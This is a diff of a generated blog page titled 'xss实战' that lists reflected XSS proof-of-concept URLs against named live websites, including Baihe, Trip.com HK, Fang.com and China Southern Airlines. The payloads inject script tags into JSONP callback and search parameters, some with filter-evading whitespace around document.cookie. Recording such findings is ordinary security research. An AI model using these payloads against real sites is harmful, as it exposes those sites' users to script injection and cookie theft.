@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="xss实战百合网首页： http://www.baihe.com/betatest/betatest_newlandpage.html?policy=1&amp;amp;Channel=baidu&amp;amp;Code=ppcbh00  1&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;  http://sns.hunli.baihe.com/H5/notice/ajaxGe">
+<meta name="description" content="记录发现的XSS漏洞 xss实战">
 <meta name="keywords" content="XSS">
 <meta property="og:type" content="article">
 <meta property="og:title" content="xss实战">
 <meta property="og:url" content="blog.shenzihao.top/2019/08/10/xss实战/index.html">
 <meta property="og:site_name" content="changyouB-log">
-<meta property="og:description" content="xss实战百合网首页： http://www.baihe.com/betatest/betatest_newlandpage.html?policy=1&amp;amp;Channel=baidu&amp;amp;Code=ppcbh00  1&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;  http://sns.hunli.baihe.com/H5/notice/ajaxGe">
+<meta property="og:description" content="记录发现的XSS漏洞 xss实战">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-08-10T12:36:49.318Z">
+<meta property="og:updated_time" content="2019-08-11T05:59:55.698Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="xss实战">
-<meta name="twitter:description" content="xss实战百合网首页： http://www.baihe.com/betatest/betatest_newlandpage.html?policy=1&amp;amp;Channel=baidu&amp;amp;Code=ppcbh00  1&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;  http://sns.hunli.baihe.com/H5/notice/ajaxGe">
+<meta name="twitter:description" content="记录发现的XSS漏洞 xss实战">
 
 
 
@@ -181,6 +181,36 @@
     <ul id="menu" class="menu">
       
         
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
         <li class="menu-item menu-item-archives">
           <a href="/archives/" rel="section">
             
@@ -231,6 +261,15 @@
       <meta itemprop="image" content="/images/1.jpg">
     </span>
 
+     <span title="Words count in article">
+     168 字
+     </span>
+
+        ...
+     <span title="Reading time">
+     1 分钟
+     </span>
+
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="changyouB-log">
     </span>
@@ -279,6 +318,37 @@
           
 
           
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  168
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time </span>
+                
+                <span title="Reading time">
+                  1
+                </span>
+              
+            </div>
+          
 
           
 
@@ -295,48 +365,25 @@
       
 
       
-        <h1 id="xss实战"><a href="#xss实战" class="headerlink" title="xss实战"></a>xss实战</h1><h4 id="百合网"><a href="#百合网" class="headerlink" title="百合网"></a>百合网</h4><p>首页： <a href="http://www.baihe.com/betatest/betatest_newlandpage.html?policy=1&amp;Channel=baidu&amp;Code=ppcbh00" target="_blank" rel="noopener">http://www.baihe.com/betatest/betatest_newlandpage.html?policy=1&amp;Channel=baidu&amp;Code=ppcbh00</a></p>
+        <p>记录发现的XSS漏洞</p>
+<h1 id="xss实战"><a href="#xss实战" class="headerlink" title="xss实战"></a>xss实战</h1><a id="more"></a>
+
+<p> <a href="http://www.baihe.com/betatest/betatest_newlandpage.html?policy=1&amp;Channel=baidu&amp;Code=ppcbh00" target="_blank" rel="noopener">http://www.baihe.com/betatest/betatest_newlandpage.html?policy=1&amp;Channel=baidu&amp;Code=ppcbh00</a></p>
 <hr>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-http://sns.hunli.baihe.com/H5/notice/ajaxGetList?jsonCallBack=c%3Cscript%3Ealert(/xss/)%3C/script%3E
-
-
-
-http://sns.hunli.baihe.com/H5/notice/ajaxGetList?jsonCallBack=calert(/xss/)
-
-
-
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/1/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p><a href="http://u.baihe.com/index/getJYadvs?jsonCallBack=%3Cscript%3Ealert(/1/)%3C/script%3E**](http://u.baihe.com/index/getJYadvs?jsonCallBack=alert(/1/)]" target="_blank" rel="noopener">http://u.baihe.com/index/getJYadvs?jsonCallBack=%3Cscript%3Ealert(/1/)%3C/script%3E**](http://u.baihe.com/index/getJYadvs?jsonCallBack=alert(/1/)]</a>( <a href="http://localhost:4000" target="_blank" rel="noopener">http://localhost:4000</a> )</p>
- <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(%0ddocument%0a.%09cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-http://u.baihe.com/index/getJYadvs?jsonCallBack=%3Cscript%3Ealert(%0ddocument%0a.%09cookie);%3C/script%3E
-
-
-
- http://sns.hunli.baihe.com/H5/notice/ajaxGetList?jsonCallBack=%3Cscript%3Ealert(%0ddocument%0a.%09cookie);%3C/script%3E
-
-
-
-HK携程
-
-https://hk.trip.com/travel-guide/search/?keyword=%3Cscript%3Ealert(%2Fxss%2F)%3C%2Fscript%3E
-
-
-
------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-房天下
-
- <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
+<p><a href="http://sns.hunli.baihe.com/H5/notice/ajaxGetList?jsonCallBack=c%3Cscript%3Ealert(/xss/)%3C/script%3E" target="_blank" rel="noopener">http://sns.hunli.baihe.com/H5/notice/ajaxGetList?jsonCallBack=c%3Cscript%3Ealert(/xss/)%3C/script%3E</a></p>
+<hr>
+<p><a href="http://sns.hunli.baihe.com/H5/notice/ajaxGetList?jsonCallBack=calert(/xss/)" target="_blank" rel="noopener">http://sns.hunli.baihe.com/H5/notice/ajaxGetList?jsonCallBack=calert(/xss/)</a></p>
+<hr>
+<p><a href="http://u.baihe.com/index/getJYadvs?jsonCallBack=%3Cscript%3Ealert(/1/)%3C/script%3E" target="_blank" rel="noopener">http://u.baihe.com/index/getJYadvs?jsonCallBack=%3Cscript%3Ealert(/1/)%3C/script%3E</a></p>
+<hr>
+<p><a href="http://u.baihe.com/index/getJYadvs?jsonCallBack=%3Cscript%3Ealert(%0ddocument%0a.%09cookie);%3C/script%3E" target="_blank" rel="noopener">http://u.baihe.com/index/getJYadvs?jsonCallBack=%3Cscript%3Ealert(%0ddocument%0a.%09cookie);%3C/script%3E</a></p>
+<hr>
+<p> <a href="http://sns.hunli.baihe.com/H5/notice/ajaxGetList?jsonCallBack=%3Cscript%3Ealert(%0ddocument%0a.%09cookie);%3C/script%3E" target="_blank" rel="noopener">http://sns.hunli.baihe.com/H5/notice/ajaxGetList?jsonCallBack=%3Cscript%3Ealert(%0ddocument%0a.%09cookie);%3C/script%3E</a></p>
+<hr>
+<p><a href="https://hk.trip.com/travel-guide/search/?keyword=%3Cscript%3Ealert(%2Fxss%2F)%3C%2Fscript%3E" target="_blank" rel="noopener">https://hk.trip.com/travel-guide/search/?keyword=%3Cscript%3Ealert(%2Fxss%2F)%3C%2Fscript%3E</a></p>
+<hr>
 <p><a href="https://yz.esf.fang.com/map/" target="_blank" rel="noopener">https://yz.esf.fang.com/map/</a></p>
 <hr>
-<p>中国南方航空</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
 <p><a href="https://b2c.csair.com/portal/minPrice/queryMinPriceInAirLines?jsoncallback=%3Cscript%3Ealert(/xss/)%3C/script%3E&amp;inter=Y" target="_blank" rel="noopener">https://b2c.csair.com/portal/minPrice/queryMinPriceInAirLines?jsoncallback=%3Cscript%3Ealert(/xss/)%3C/script%3E&amp;inter=Y</a></p>
 <hr>
 <p><a href="https://www.zhuego.com/index.php?m=search&amp;a=product&amp;key=%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E" target="_blank" rel="noopener">https://www.zhuego.com/index.php?m=search&amp;a=product&amp;key=%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E</a></p>
@@ -472,10 +519,10 @@ https://hk.trip.com/travel-guide/search/?keyword=%3Cscript%3Ealert(%2Fxss%2F)%3C
               
               
               <div class="site-state-item site-state-tags">
-                
+                <a href="/tags/index.html">
                   <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">tags</span>
-                
+                </a>
               </div>
             
 
@@ -528,7 +575,7 @@ https://hk.trip.com/travel-guide/search/?keyword=%3Cscript%3Ealert(%2Fxss%2F)%3C
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#xss实战"><span class="nav-number">1.</span> <span class="nav-text">xss实战</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#百合网"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">百合网</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#xss实战"><span class="nav-number">1.</span> <span class="nav-text">xss实战</span></a></li></ol></div>
             
 
           </div>
@@ -564,7 +611,7 @@ https://hk.trip.com/travel-guide/search/?keyword=%3Cscript%3Ealert(%2Fxss%2F)%3C
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count"></span>
+    <span title="Site words total count">47.4k</span>
   
 </div>
 
